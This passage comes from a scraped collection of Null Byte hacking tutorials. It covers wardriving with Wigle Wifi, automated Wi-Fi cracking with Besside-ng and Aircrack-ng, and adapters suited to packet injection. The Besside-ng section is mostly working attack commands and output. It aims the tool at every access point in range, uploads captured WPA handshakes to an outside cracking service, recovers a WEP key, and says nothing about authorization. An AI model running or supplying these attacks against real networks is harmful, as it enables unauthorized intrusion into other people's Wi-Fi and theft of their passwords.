wardrivers to track down probe frames.\nStep 1: Setting Up a Wigle Account\nWigle Wifi is tightly integrated with the Wigle.net database and website. So before we even install the Wigle Wifi app, we'll want to create a Wigle.net account.\nIf you're on your computer, just navigate to Wigle.net in your browser and click on the \"Login\" button up top to show the \"Register\" option. In your phone's browser, after going to the website, tap on the hamburger icon, select \"Login,\" then \"Register.\"\nFill out the fields to create your free account. After that, remember the user name and password so you can input it into the Wigle Wifi app later. This will allow you to upload to the site and retrieve your entire database.\nStep 2: Installing Wigle Wifi\nWigle Wifi is available in the Google Play Store, so just visit that link to download and install it onto your Android device. You need Android 4.0 and higher, so this will literally work on any smartphone you have collecting dust around your place.\nStep 3: Running Wigle Wifi on Android\nOnce you've got the app installed, open it to the main screen. Wigle Wifi is an aggressive app and will override settings to turn the Wi-Fi card on while it's running, so don't be surprised if your Wi-Fi turns on with Wigle Wifi running in the background.\nAfter granting the app all of the required permissions, a run should start right away. If not, make sure you're on the \"Network List\" page (via the hamburger icon), then tap on the three-dots icon in the top right. Select \"Scan On\" to begin scanning through channels and collecting wireless information. This will immediately begin displaying wireless networks in the area.\nThe \"Network List\" screen with scanning off.\nKeep in mind, Wigle Wifi will consume extra power while scanning and logging networks. The more often you run it in the background, though, the better location accuracy you'll get. You can go back to the same three-dot menu and select \"Scan Off\" when you don't need it.\n* Don't Miss: Capture WPA Passwords by Targeting Users with a Fluxion Attack\nStep 4: Adjusting Wigle Wifi's Settings\nTo adjust the settings, you can access the menu by tapping the hamburger icon on the top left and selecting the \"Settings\" option. At the top of this menu, you can enter your Wigle.net login and password.\nHere, you can also adjust the display and run options, as well as specific options like how to increase or decrease scan times in response to changes in speed. Increasing the number of scans will drain the battery faster but capture more networks if you're moving quickly.\nStep 5: Backing Up Your Runs from Wigle Wifi\nMake sure you've entered your Wigle.net login at the top of the \"Settings\" menu item, then back up your data in the app by tapping the \"Upload to Wigle.net\" button on the Network List page. When you upload your runs, you'll always be able to view and download them later on Wigle.net.\nHere, we see many runs with number of networks and other information displayed.\nStep 6: Using the Wigle.net Website\nTo easily search your entire database, as well as other contributed data, we'll open Wigle.net in a browser. You can do this on your phone's browser or your computer's browser.\nThere are many ways to search for information on Wigle.net. In the Wigle Wifi app, you can search for nearby networks, but on the website, you can search the entire database of contributions. The most obvious settings are under the \"Search\" function that appears after you log into your account.\nSearching the Wigle.net database for a network.\nFor a more visual overview of the target, check out the \"Maps\" section. You can type in an address and adjust overlay filters to create a graphical map of the target with wireless data overlayed.\nLots of people wardrive, and there is a lot of information already out there.\nSelecting on a network will give you more information about it. You can filter networks with the list of options on the right of the screen. Look up your address and see if your router has been logged!\nStep 7: Searching Local Queries in Wigle Wifi's Map\nIf you want to search a wardriving run on your phone rather than Wigle.net, you can do so (or watch results appear on the map live) by tapping the \"Map\" menu option. This will open a map of the area pinned to your current location and display nearby networks. Tapping on a network will bring up information about the manufacturer, the security used, and the channel and BSSID. Below, we see some mapped results from a local run.\nQuerying the local database on the Wigle Wifi app.\nYou can see how many networks you've collected in a run by selecting the \"Dashboard\" option in the menu.\nWigle Wifi lets you build your own database of networks around you. Image by SADMIN/Null Byte\nStep 8: Exporting Data from Recon Runs in Wigle Wifi\nMaybe you want to work with your data directly. Navigating to the \"Database\" tab on the Wigle app shows the various options for exporting data from Wigle Wifi.\nIf you want to pull everything you've ever uploaded into one file, you can select \"Import Observed.\" Doing this pulls from Wigle.net, so be prepared to wait a little for the download if you have a ton of networks. You can also use this tab to search network runs, although sometimes this functionality can be a little buggy.\nThe Wigle team also shared a few more tips with us for accessing your data: First, you can access the runs from your SD card or internal memory; Each run is archived upon upload, and the SQLite database can be backed up and accessed. Second, the transid on your uploads page gives you a link to a KML representation of your run with bad and incomplete data points filtered out for the most part.\nStep 9: Contributing to the Big Picture\nWigle.net works because of people contributing. If you feel like adding to the giant pool of knowledge that is Wigle.net (or you've got a competitive streak), consider adding to the community database to build a better OSINT tool for fellow wireless researchers.\nThere is a thriving community of wardrivers who compete to discover the most networks, and anyone can join! You can even create a team to rank up against other wardriving teams. With some users having discovered millions of new networks, competition is fierce for a place in wardriving history. Check out the \"Rankings\" menu item in the app.\nIt currently takes finding over 100,000 new (previously unknown to Wigle.net) Wi-Fi networks just to crack the top 500 users on Wigle's leaderboard, so be prepared to do some serious hunting to earn street cred in the wardriving community!\nWhether you're wardriving for tactical network reconnaissance, to build a database of your city's Wi-Fi networks, or just to contribute to an exciting project, Wigle Wifi is a great tool to quickly learn about the wireless world around you.\nTactical wardriving, or warwalking, can give you a picture of a target's wireless infrastructure. Image by SADMIN/Null Byte\nAs we learned with Routersploit, even an unrooted Android phone can get you started hacking! If you have any questions, ask them here or @sadmin2001 on Twitter or Instagram.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Automating Wi-Fi Hacking with Besside-ng",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-automating-wi-fi-hacking-with-besside-ng-0176170/",
        "content": "* On a live USB or another temporary install of Kali Linux.\nOur Kali Linux build is the easiest way to get started. For hardware, the only real requirement is a wireless network adapter capable of packet injection. (It should be noted that our testing has found bugs when using the Atheros AR9271 chipset.)\nRecommended Wireless Network Adapter: Panda Wireless PAU07 N600 Dual Band Wireless N USB Adapter\nStep 1: Verify You Have the Aircrack-ng Suite\nIn our demonstration, I will be connected to our Raspberry Pi build running Kali Linux via SSH, but this will work the same on any Kali install. First, let's make sure we have the Aircrack-ng suite updated. Type man aircrack-ng to check if it already exists on the system.\n~$ man aircrack-ng\nAIRCRACK-NG(1)           General Commands Manual           AIRCRACK-NG(1)\naircrack-ng - a 802.11 WEP / WPA-PSK key cracker\naircrack-ng [options] <input file(s)>\nDESCRIPTION\naircrack-ng  is  an 802.11 WEP, 802.11i WPA/WPA2, and 802.11w WPA2\nkey cracking program.\nIt can recover the WEP key once enough encrypted packets have been\ncaptured  with airodump-ng. This part of the aircrack-ng suite de‐\ntermines the WEP key using  two  fundamental  methods.  The  first\nmethod is via the PTW approach (Pyshkin, Tews, Weinmann). The main\nadvantage of the PTW approach is that very few  data  packets  are\nrequired  to crack the WEP key. The second method is the FMS/KoreK\nmethod. The FMS/KoreK method incorporates various statistical  at‐\ntacks  to  discover the WEP key and uses these in combination with\nbrute forcing.\nAdditionally, the program offers a dictionary method for determin‐\ning the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist\n(file or stdin) or an airolib-ng has to be used.\nINPUT FILES\nCapture files (.cap, .pcap), IVS (.ivs) or  Hashcat  HCCAPX  files\nCommon options:\nForce  the  attack mode: 1 or wep for WEP (802.11) and 2 or\nwpa for WPA/WPA2 PSK (802.11i and 802.11w).\nSelect the target network based on the ESSID.  This  option\nis  also  required for WPA cracking if the SSID is cloaked.\nFor    SSID    containing    special    characters,     see\nhttps://www.aircrack-ng.org/doku.php?id=faq#how_to_use_spa‐\nces_double_quote_and_single_quote_etc_in_ap_names\n-b <bssid> or --bssid <bssid>\nSelect the target network based on the access point MAC ad‐\nSet  this  option to the number of CPUs to use (only avail‐\nable on SMP systems) for cracking  the  key/passphrase.  By\ndefault, it uses all available CPUs\n-q     If set, no status information is displayed.\n-C <macs> or --combine <macs>\nMerges all those APs MAC (separated by a comma) into a vir‐\nWrite the key into a file. Overwrites the file  if  it  al‐\nready exists.\nStatic WEP cracking options:\n-c     Search alpha-numeric characters only.\n-t     Search binary coded decimal characters only.\n-h     Search the numeric key for Fritz!BOX\n-d <mask> or --debug <mask>\nSpecify mask of the key. For example: A1:XX:CF\nOnly  keep  the IVs coming from packets that match this MAC\naddress. Alternatively, use -m ff:ff:ff:ff:ff:ff to use all\nand every IVs, regardless of the network (this disables ES‐\nSID and BSSID filtering).\nSpecify the length of the key: 64 for 40-bit WEP,  128  for\n104-bit  WEP,  etc.,  until 512 bits of length. The default\nvalue is 128.\nOnly keep the IVs that have this key index (1  to  4).  The\ndefault  behavior is to ignore the key index in the packet,\nand use the IV regardless.\nBy default, this parameter is set to 2. Use a higher  value\nto  increase  the bruteforce level: cracking will take more\ntime, but with a higher likelihood of success.\nThere are 17 KoreK attacks. Sometimes one attack creates  a\nhuge false positive that prevents the key from being found,\neven with lots of IVs. Try -k 1, -k 2, ... -k 17 to disable\neach attack selectively.\nDisable last keybytes bruteforce (not advised).\n-x1    Enable last keybyte bruteforcing (default)\n-x2    Enable last two keybytes bruteforcing.\n-X     Disable bruteforce multithreading (SMP only).\n-s     Shows ASCII version of the key at the right of the screen.\n-y     This  is  an  experimental  single brute-force attack which\nshould only be used when the  standard  attack  mode  fails\nwith more than one million IVs.\n-z     Uses  PTW (Andrei Pyshkin, Erik Tews and Ralf-Philipp Wein‐\nmann) attack (default attack).\n-P <num> or --ptw-debug <num>\nPTW debug: 1 Disable klein, 2 PTW.\n-K     Use KoreK attacks instead of PTW.\n-D or --wep-decloak\nWEP decloak mode.\n-1 or --oneshot\nRun only 1 try to crack key with PTW.\n-V or --visual-inspection\nRun in visual inspection mode. Can only be used when  using\nWEP and WPA-PSK cracking options\nPath  to a dictionary file for wpa cracking. Separate file‐\nnames with comma when using multiple dictionaries.  Specify\n\"-\"   to   use   stdin.   Here  is  a  list  of  wordlists:\nhttps://www.aircrack-\nng.org/doku.php?id=faq#where_can_i_find_good_wordlists   In\norder to use a dictionary with hexadecimal  values,  prefix\nthe  dictionary  with  \"h:\".  Each byte in each key must be\nseparated by ':'. When using with WEP, key length should be\nspecified using -n.\n-N <file> or --new-session <file>\nCreate  a  new cracking session. It allows one to interrupt\ncracking session and restart at a later time (using  -R  or\n--restore-session). Status files are saved every 5 minutes.\nIt does not overwrite existing session file.\n-R <file> or --restore-session <file>\nRestore and continue a previously saved  cracking  session.\nThis  parameter  is  to  be  used alone, no other parameter\nshould be specified when starting aircrack-ng (all the  re‐\nquired information is in the session file).\nWPA-PSK options:\nCreate  Elcomsoft  Wireless Security Auditor (EWSA) Project\nfile v3.02.\nCreate Hashcat v3.6+ Capture file (HCCAPX).\nCreate Hashcat Capture file (HCCAP).\n-S     WPA cracking speed test.\nWPA cracking speed test execution length in seconds.\n-r <database>\nPath to the airolib-ng database. Cannot be used with '-w'.\nSIMD selection:\n--simd=<option>\nAircrack-ng automatically loads and uses the fastest  opti‐\nmization based on instructions available for your CPU. This\noptions allows one to force another  optimization.  Choices\ndepend  on the CPU and the following are all the possibili‐\nties that may be  compiled  regardless  of  the  CPU  type:\ngeneric,  sse2,  avx,  avx2,  avx512, neon, asimd, altivec,\n--simd-list\nShows a list of the available SIMD architectures, separated\nby a space character. Aircrack-ng automatically selects the\nfastest optimization and thus it is rarely  needed  to  use\nthis option. Use case would be for testing purposes or when\na \"lower\" optimization, such as \"generic\", is  faster  than\nthe  automatically  selected one. Before forcing a SIMD ar‐\nchitecture, verify that the  instruction  is  supported  by\nyour CPU, using -u.\nOther options:\n-H or --help\nShow help screen\n-u or --cpu-detect\nProvide information on the number of CPUs and SIMD support\nThis  manual page was written by Adam Cecile <gandalf@le-vert.net>\nfor the Debian system (but may be used by others).  Permission  is\ngranted  to copy, distribute and/or modify this document under the\nterms of the GNU General Public License, Version 2  or  any  later\nversion  published  by the Free Software Foundation On Debian sys‐\ntems, the complete text of the GNU General Public License  can  be\nfound in /usr/share/common-licenses/GPL.\nairbase-ng(8)\naireplay-ng(8)\nairmon-ng(8)\nairodump-ng(8)\nairodump-ng-oui-update(8)\nairserv-ng(8)\nairtun-ng(8)\nbesside-ng(8)\neasside-ng(8)\ntkiptun-ng(8)\nwesside-ng(8)\nairdecap-ng(1)\nairdecloak-ng(1)\nairolib-ng(1)\nbesside-ng-crawler(1)\nbuddy-ng(1)\nivstools(1)\nmakeivs-ng(1)\npacketforge-ng(1)\nwpaclean(1)\nairventriloquist(8)\nVersion 1.6.0                  January 2020                AIRCRACK-NG(1)\nIf not, or if we want to make sure it's updated, let's run the following command.\n~$ sudo apt install aircrack-ng\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\naircrack-ng is already the newest version (1:1.6-4).\naircrack-ng set to manually installed.\n0 upgraded, 0 newly installed, 0 to remove and 17 not upgraded.\nOnce we confirm we have the suite and it's updated, we can proceed with the attack.\nStep 2: Identify Your Attack Antenna & Let It Rip\nOn Kali Linux, you can type iwconfig to see a list of available antennas. If you are connecting to your Kali Linux device remotely via SSH or VNC, now is a great time to note which antenna is hosting your data connection (the one with the IP address assigned).\nStarting Besside-ng on the wrong antenna will instantly sever your remote connection and lock you out of the device until you restart if you are connected via SSH. Here we see my attack antenna is idle while my command and control antenna is attached to a network.\n~$ sudo iwconfig\nwlan0   IEEE 802.11bgn ESSID:\"████████████████████\"\nMode:Managed Frequency:2.462 GHz  Access Point: ████████████████████\nBit Rate=72 Mb/s   Tx-Power=1496 dBm\nRetry short limit:7   RTS thr:off   Fragment thr:off\nEncryption key:off\nPower Management:on\nLink Quality=60/70   Signal level=50 dBm\nRx invalid nvid:0   Rx invalid crypt:0   Rx invalid frag:0\nTx excessive retries:0   Invalid misc:0   Missed beacon:0\nlo      no wireless extensions.\neth0    no wireless extensions.\nwlan1   IEEE 802.11bgn ESSID:off/any\nMode:Managed   Access Point: Not-Associated   Tx-Power=1496 dBm\nRetry short limit:7   RTS thr:off   Fragment thr:off\nEncryption key:off\nPower Management:off\nIf you are not on Kali, you can run ifconfig to see attached antennas and look for \"wlan\" to spot the wireless antennas. In this case, wlan1 is my attack antenna.\nStep 3: Configure Your Attack & Let's Ride\nBesside-ng is dead simple. To learn more about it, visit it's man page.\n~$ man besside-ng\nBESSIDE-NG(8)            System Manager's Manual            BESSIDE-NG(8)\nbesside-ng  - crack a WEP or WPA key without user intervention and\ncollaborate with WPA cracking statistics\nbesside-ng [options] <interface>\nDESCRIPTION\nbesside-ng is a tool which will crack  all  the  WEP  networks  in\nrange  and  log all the WPA handshakes.  WPA handshakes can be up‐\nloaded to the online  cracking  service  at  wpa.darkircop.org.\nWpa.darkircop.com  also  provides useful statistics based on user-\nsubmitted capture files about the feasibility of WPA cracking.\n-b <target mac>\nSpecifies the target's BSSID\n-s <WPA server>\nWhere to upload capture file for cracking. A good choice is\nwpa.darkircop.org\nChannel lock\nPackages per second to send (flood rate).\n-W     Crack only WPA networks\n-v     Verbose  mode.  Use -vv for more verbose, -vv for even more\n-h     Help screen\nThis manual page was written by David Francos  Cuartero.   Permis‐\nsion  is  granted  to copy, distribute and/or modify this document\nunder the terms of the GNU General Public License,  Version  2  or\nany later version published by the Free Software Foundation On De‐\nbian systems, the complete text of the GNU General Public  License\ncan be found in /usr/share/common-licenses/GPL.\nairbase-ng(8)\naireplay-ng(8)\nairmon-ng(8)\nairodump-ng(8)\nairodump-ng-oui-update(8)\nairserv-ng(8)\nairtun-ng(8)\neasside-ng(8)\ntkiptun-ng(8)\nwesside-ng(8)\naircrack-ng(1)\nairdecap-ng(1)\nairdecloak-ng(1)\nairolib-ng(1)\nbesside-ng-crawler(1)\nbuddy-ng(1)\nivstools(1)\nmakeivs-ng(1)\npacketforge-ng(1)\nwpaclean(1)\nairventriloquist(8)\nVersion 1.6.0                  January 2020                 BESSIDE-NG(8)\nWith the attack antenna known as wlan1, simply type the following command to initiate a wide-area attack against all detected APs. While it helps to put an adapter in monitor mode, Besside-ng will take care of that.\n~$ sudo besside-ng wlan1 -vv\n[10:07:47] mac ██:██:██:██:██:██\n[10:07:47] Let's ride\n[10:07:47] Resuming from besside-ng\n[10:07:47] Found AP ████████████████ [██████] chan 0 crypto WPA dbm 0\n[10:07:47] Found AP ████████████████ [████████████████] chan 0 crypto WPA dbm 0\n[10:07:47] Found AP ████████████████ [████████] chan 0 crypto WPA dbm 0\n[10:07:47] Found AP ████████████████ [████] chan 0 crypto WPA dbm 0\n[10:07:47] Found AP ████████████████ [████████] chan 0 crypto WPA dbm 0\n[10:07:47] Found AP ████████████████ [██████████████] chan 0 crypto WPA dbm 0\n[10:07:47] Appending to wpa.cap\n[10:07:47] Appemding to wep.cap\n[10:07:47] Logging to besside.log\n[10:07:47] Found AP ████████████████ [██████] chan 1 crypto WPA dbm -01\n[10:07:47] Found AP ████████████████ [██████] chan 2 crypto WPA dbm -04\n[10:07:47] Found AP ████████████████ [████████] chan 1 crypto WPA dbm -06\n[10:07:47] Found AP ████████████████ [██████████████████] chan 1 crypto WPA dbm -00\n[10:07:48] Found AP ████████████████ [████████] chan 3 crypto WPA dbm -56\n[10:07:48] Found AP ████████████████ [██████████] chan 4 crypto WPA dbm -79\n[10:07:49] Found AP ████████████████ [████████████] chan 7 crypto WPA dbm -50\n[10:07:50] Found AP ████████████████ [████] chan 9 crypto WPA dbm -49\n[10:07:50] Found AP ████████████████ [██████] chan 11 crypto WPA dbm -83\n[10:07:51] Found AP ████████████████ [██████] chan 11 crypto WPA dbm -72\n[10:07:51] Found AP ████████████████ [████████] chan 1 crypto WPA dbm -59\n[10:07:52] Found AP ████████████████ [████████] chan 3 crypto WPA dbm -63\n[10:07:52] Found AP ████████████████ [████] chan 4 crypto WPA dbm -53\n[10:07:53] Found AP ████████████████ [████████████████] chan 6 crypto WPA dbm -65\n[10:07:53] Found AP ████████████████ [██████████████████████] chan 7 crypto WPA dbm -66\n[10:07:54] - Scanning chan 11\nShit will proceed to hit the fan, with the script automatically throwing the wireless card into monitor mode and scanning all channels for targets. On the first run or two, you may get a \"no child process\" error. Just run the sudo besside-ng wlan1 command again, and it will start. To see everything the script is doing, add the -vv argument at the end. You'll see the blistering speed at which Besside-ng finds, prioritizes, pings, and attacks networks.\nStep 4: Clarify the Operation During Attack Runs\nIn a target-rich environment, Besside-ng will run continuously for days or weeks, with my current endurance record over one week of continuous attacking. While the attack runs, it will prioritize WEP networks as they can be wholly compromised from within the script. As such, Besside-ng may focus too heavily on WEP and slow down the attack. You can prevent this by only attacking WPA networks by adding the -W argument to the command, as the help page suggests.\n~$ sudo besside-ng -h\nBesside-ng 1.6  - (C) 2010 Andrea Bittau\nhttps://www.aircrack-ng.org\nUsage: besside-ng [options] <interface>\n-b <victim mac>      : Victim BSSID\n-R <victim ap regex> : Victim ESSID regex\n-s <WPA server>      : Upload wpa.cap for cracking\n-c <chan>            : chanlock\n-p <pps>             : flood rate\n-W                   : WPA only\n-v                   : verbose, -vv for more, etc.\n-h                   : This help screen\nThis script will, by default, scan all channels, which makes it too slow for wardriving or null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/ to capture handshakes since, by the time the master list of APs to attack is built and prioritized, you're a block away.\nThis can be mitigated in part by adding the -c argument and followed by a channel number to stay locked on. Doing so builds the target list much more quickly, at the expense of only attacking one channel. Run Airodump-ng to determine the best channels to lock to.\nIf you wish to attack a particular network, you can add the -b argument followed by the BSSID of the target to specify which access point you want to attack. This is useful for networks with many APs under the same name (extended service sets), which may have many identically named APs that all appear as the same Wi-Fi network. Adding this argument allows you to focus your attack on a particular AP under the umbrella of the network and make faster progress on cracking a WEP key.\nStep 5: Auto-Crack Passwords from WPA.cap During an Attack\nSoon, you will begin to gather WPA handshakes, potentially a lot of them. They will be automatically appended to the wpa.cap file, which is created in your home directory if it doesn't already exist. WEP packets are similarly saved to a file called wep.cap, both of which can be run in Aircrack-ng to attempt to get the password.\n[10:52:55] Crappy connection - ████████ unreachable got 0/10 (100% loss) [-85 dbm]\n[10:53:12] Got necessary WFA handshake info for ████████\n[10:53:12] Uploaded WPA handshake to wpa.darkircop.org\n[10:53:12] Pwned network ████████ in 0:07 mins:secs\n[10:53:12] TO-OWN [████████ ████████████████ ████████ ████  ████████████████████]\nWe can run these in Aircrack-ng against our own password list, but electricity is expensive, and brute-force attacks are very dull. Instead, we can use the -s argument to specify a WPA server to upload the handshakes. This will let a distributed service like wpa.darkircop.org crack the passwords for us.\nStep 6: Auto-Crack Passwords from WEP.cap During an Attack\nIf Besside-ng detects a WEP network in range, it will cyberbully the hell out of it. You can open a second terminal window and begin attacking a WEP network while Besside-ng collects unique IVs Aircrack-ng needs to crack the network.\nIn a terminal, select the network to attack by typing the following. A list of all WEP captures by Besside-ng will be displayed.\n~$ sudo aircrack-ng ./wep.cap\nOpening /Users/████████/web.cap\nRead 75862 packets.\n#  BSSID             ESSID               Encryption\n1  ████████████████  ████████████████    WEP (28122 IVs)\n2  ████████████████                      WEP (1012 IVs)\n3  ████████████████                      WPA (0 handshake)\n4  ████████████████                      WEP (108 IVs)\n5  ████████████████                      WEP (4 IVs)\n6  ████████████████                      WPA (0 handshake)\n7  ████████████████                      WPA (0 handshake)\n8  ████████████████                      WEP (7 IVs)\n9  ████████████████                      WPA (0 handshake)\n10  ████████████████                      WEP (7 IVs)\n11  ████████████████                      WPA (0 handshake)\n12  ████████████████                      WEP (6 IVs)\n13  ████████████████  ██████████████      WEP (6 IVs)\n14  ████████████████                      WEP (13 IVs)\n15  ████████████████  ███████████████     WEP (19984 IVs)\n16  ████████████████                      WEP (22 IVs)\n17  ████████████████  ████████████████    WEP (44 IVs)\n18  ████████████████  ████████████        WEP (20240 IVs)\n19  ████████████████                      WEP (12 IVs)\n20  ████████████████  ████████            WEP (1 IVs)\n21  ████████████████                      WEP (1 IVs)\n22  ████████████████  ████████            WEP (749 IVs)\n23  ████████████████  ████████            WEP (105 IVs)\n24  ████████████████  ████████            WEP (1 IVs)\n25  ████████████████  ████████████████    WEP (1578 IVs)\n26  ████████████████                      WEP (9 IVs)\n27  ████████████████  ███████████████████ WEP (7 IVs)\n28  ████████████████  ██████████████████  WEP (1 IVs)\n29  ████████████████  ██████████████      WEP (2 IVs)\n30  ████████████████  ████████████████    WEP (3 IVs)\n31  ████████████████  ████████            WEP (3052 IVs)\n32  ████████████████  ██████              WEP (4 IVs)\nIndex number of target networks ?\nSelect the number of the network Besside-ng will target, and a beautiful symphony of math ensues as Aircrack-ng attacks the encryption.\nIndex number of target networks ? 18\nAircrack-ng 1.2 rc4\n[00:00:07] Tested 794881 keys (got 25521 IVs)\nKB      depth   byte(vote)\n0      0/  1   21(38912) AC(34560) 5B(32768) 1F(31744) C8(31744) 0D(30976) 63(30976) 8C(30976) 82(30720) 09(30464) 69(30464) A0(30464) FC(30464)\n1      2/  3   78(32000) F5(31744) FE(30976) 06(30464) 3E(30464) 9F(30464) AC(30464) C6(30464) D2(30464) 38(30208) 43(30208) 4D(30208) 1C(22952)\n2      0/  1   FB(36352) 33(32768) 0F(32256) 37(31744) 2D(30976) DA(30720) 0D(30208) 61(30208) 9E(30208) AD(30208) C5(30208) F9(30208) 45(29952)\n3      1/  2   4D(34304) A0(32512) 18(31744) 81(30406) C7(30464) F9(30464) 87(30208) 99(30208) A6(30208) D1(30208) F1(30208) 2B(29952) 5B(29952)\n4      1/  2   37(34304) EB(32256) C5(31488) AA(30720) EE(30208) FA(30208) 4A(29952) B3(29952) A7(29696) 61(29440) D0(29184) DB(21184) ED(28928)\n5      5/  6   D4(31488) 8F(30976) EE(30720) 3C(30208) 7D(30208) C4(30208) 77(29952) B8(29952) 5A(29696) B3(29440) 1C(29184) 61(29184) 82(29184)\n6      3/  4   D5(31488) 96(30976) 2B(30208) 90(30208) 6B(30464) AB(30464) CE(30208) F0(30208) FE(30208) 1D(29696) 33(29696) 39(29696) B8(29696)\n7     14/ 15   F6(30208) C3(29952) E0(29952) 4A(29696) AF(29696) 32(29440) 50(29440) 31(29184) 7A(29184) B6(29184) BE(29184) EE(29184) 2E(28928)\n8      3/  4   70(30976) 6B(30720) 47(30464) DF(30464) 1F(30208) 32(30208) 7F(30208) 9F(30208) B7(30208) 9C(29696) BF(29696) C3(29696) FF(26969)\n9      0/  1   AB(33536) 1F(31488) 23(31488) C6(31488) 6D(31232) BD(31232) D8(31232) 63(30976) 60(30720) 16(30464) 59(30464) A5(30208) 05(29952)\n10      4/  8   19(31232) 39(30976) E4(30976) FA(30976) 0F(30464) 44(30464) D3(30464) A2(30208) A6(29952) 09(29696) 25(29696) 50(29696) 54(29696)\n11      2/  3   C7(32000) E5(30976) 45(30464) 87(30464) F7(30464) E9(30208) 0B(29952) 41(29952) AD(29952) 31(29696) 42(29696) 9A(29696) D9(29696)\n12      1/  2   37(32256) FD(31744) 8E(31232) E7(30720) FA(30720) 68(30464) D1(30208) 45(29952) 4F(29952) 5D(29952) 65(29952) 09(29696) 39(29696)\nAircrack-ng will re-try the attack automatically every 5,000 IVs as more packets are captured by Besside-ng.\nKB      depth   byte(vote)\n0      7/  8   99(5120) D4(4864) 00(4864) 8B(4864) 07(4864) FB(4864) 11(4864) 03(4608) EC(4608) 17(4608) 18(4608) E6(4608) D9(4608)\n1     10/ 14   B2(4864) 6D(4608) 99(4608) 05(4608) A9(4352) 91(4352) 95(4352) B4(4352) 1B(4352) A7(4352) DC(4096) 1D(4096) FC(4096)\n2     14/ 15   2D(4608) D6(4352) BD(4352) CF(4352) 0D(4352) 10(4352) 86(4352) B2(4352) B1(4352) FF(4352) 79(4096) D4(4096) 03(4096)\n3     15/  3   07(4352) 4E(4352) DB(4352) 09(4352) 58(4352) 6D(4096) 25(4096) 0F(4096) 44(4096) 8B(4096) 15(4096) 85(4096) EA(4096)\n4     17/  4   95(4352) 72(4352) CC(4352) 55(4352) C2(4096) 19(4096) 2D(4096) 2F(4096) 33(4096) FF(4096) 05(4096) 07(4096) F2(4096)\nFailed. Next try with 5000 IVs.\nThis repeats until we defeat the encryption and gain the key.\nKB      depth   byte(vote)\n0      0/ 15   21(26112) E1(25600) F9(25088) B9(24832) BA(24576) A2(24320) 19(24320) 10(24064) 63(23808) DA(23552) 8C(23552) BD(23552) ED(23552)\n1     11/ 14   BA(24064) 95(23808) 59(23808) 16(23552) 62(23552) 0A(23552) 72(23552) B7(23552) 43(23552) 68(23552) A3(23552) 9D(23552) E5(23296)\n2      0/  3   20(28416) 7A(26624) 91(25856) D4(25344) 2C(25344) DC(25088) 43(25088) 0D(24832) B3(24832) 07(24832) A7(24576) 28(24064) 9A(24064)\n3      0/  1   44(32256) 1C(25856) 82(25600) C0(25088) 2B(24832) 06(24832) 7E(24576) BF(24320) 04(24320) D6(24320) 54(24064) 31(24064) A9(24064)\n4      1/ 25   00(25344) 7C(25088) 45(24832) E9(24832) 36(24832) 6C(24576) AF(24320) 25(24064) 17(23808) 3B(23808) 8C(23552) A1(23296) 4F(23296)\nKEY FOUND! [ ████████████████ ] (ASCII: █████████ )\nDecrypted correctly: 100%\nStep 7: Troubleshoot Interruptions\nBesside-ng experiences two main types of glitches — \"no child process\" and \"network is down.\" These can be related to your wireless network adapter.\nNo child process can be fixed by re-running the Besside-ng command, most of the time. Network is down is often caused by the WPA supplicant process throwing your card out of monitor mode. To solve this problem, you can run Airmon-ng:\n~$ sudo airmon-ng check kill\nThis will kill any troublesome processes for monitor mode, but it will also kill any other Wi-Fi interfaces, so be careful if you are SSHed into your device that way.\nBesside-ng vs. Wifite\nBesside-ng is not the only tool to target this niche. Suites like Wifite can also be used to attack WPA and WEP networks in automated ways. Wifite includes the added function of attacking WPS setup PINs.\nWhile Wifite certainly provides better situational awareness of wireless targets around you, not everyone has time to wait to hit each network with every attack in the book, as Wifite likes to do. In addition, the WPS setup PIN attack is aging poorly and often no longer works, which wastes a lot of time. These attacks focus on different types of automation, with Wifite throwing everything and the kitchen sink at a particular network or networks, and Besside-ng going ham over any networks that dare exist nearby.\nThe problem with Wifite is that it sucks because it takes forever, and I rarely have success with it nowadays. By comparison, Besside-ng remains blisteringly fast into the foreseeable future.\nWarning: Besside-ng Is Loud & Leaves a Ton of Evidence\nWhile Besside-ng is a phenomenal tool, the nature of the attack means it interacts with every access point in range. This leaves distinctive logs in each router targeted, meaning this attack has the subtlety of running around and smacking every device off of every Wi-Fi connection in range. It can be mitigated by focusing your attack on a particular AP. The technique usually does not disrupt regular network use and operation, but can reveal your device MAC address or physical location if run against a well-defended target.\nThanks for reading, and make sure to keep an eye on Null Byte for more hacking tutorials. You can ask me questions here or on Twitter @KodyKinzie or @NullByte.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and GIF by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Buy the Best Wireless Network Adapter for Wi-Fi Hacking in 2019",
        "link": "https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2019-0178550/",
        "content": "* Realtek 8187L (Wireless G adapters)\n* Realtek RTL8812AU (newly in 2017)\n* my research also suggests the Ralink RT5370N is compatible\nIn 2017, Kali Linux began supporting drivers for the RTL8812AU wireless chipsets. These drivers are not part of the standard Linux kernel and have been modified to allow for injection. This is a big deal because this chipset is one of the first to support 802.11 AC, bringing injection-related wireless attacks to this standard.\nKali Linux compatible adapters. Image by SADMIN/Null Byte\nAdapters That Use the Ralink RT3070 Chipset\nThe Alfa AWUS036NH 2.4 GHz($31.99 on Amazon)\nThe Alfa AWUS036NH is a b/g/n adapter with an absurd amount of range. This is amplified by the omnidirectional antenna and can be paired with a Yagi ($29.95) or Paddle ($23.99) antenna to create a directional array.\nThe AWUSO36NH. Image by SADMIN/Null Byte\nThe Alfa AWUS036NEH 2.4 GHz($29.99 on Amazon)\nIf you're looking for a somewhat more compact wireless adapter that can be plugged in via USB, the Alfa AWUS036NEH is a powerful b/g/n adapter that's slim and doesn't require a USB cable to use.\nThe AWUS036NEH, relatively compact with extreme range. Image by SADMIN/Null Byte\nThe Panda PAU05 2.4 GHz($13.99 on Amazon)\nSometimes you need a stealthier option that's still powerful enough to pwn networks without making a big fuss about plugging in large, suspicious network adapters. Consider the g/n PAU05, affectionately nicknamed \"El Stubbo\" and a personal favorite both for its low profile and its aggressive performance in the short and medium range. Consider this if you need to gather network data without including everything within several blocks.\nA note on the Panda from one of our readers: The Panda PAUO5 on Amazon won't do packet injection. It seems they now ship with an unsupported 